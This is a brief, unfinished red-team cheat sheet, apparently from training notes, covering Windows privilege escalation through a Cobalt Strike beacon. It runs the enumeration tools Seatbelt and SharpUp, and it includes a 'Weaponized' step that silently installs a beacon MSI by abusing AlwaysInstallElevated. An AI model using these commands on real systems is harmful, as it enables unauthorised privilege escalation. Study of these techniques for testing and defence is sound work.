# RTO CheatSheet

## Persistence

### COM Hijacking

<TODO>
  
## PrivEsc
  
### Enumeration
  
#### Seatbelt
  
https://github.com/GhostPack/Seatbelt
  
Sample usage:
  
> beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
  
#### SharpUp

https://github.com/GhostPack/SharpUp

Sample usage:
  
> beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
> 
> === Modifiable Services ===
> 
>  Name             : Vuln-Service-2
>
>  DisplayName      : Vuln-Service-2
>
>  Description      : 
>
>  State            : Running
>
>  StartMode        : Auto
>
>  PathName         : "C:\Program Files\Vuln Services\Service 2.exe"

Detects:
  - Modifiable Service
  - AlwaysInstallElevated flags in Registry
  
### Weaponized

#### AlwaysInstallElevated - Install msi package file

> beacon> run msiexec /i BeaconInstaller.msi /q /n
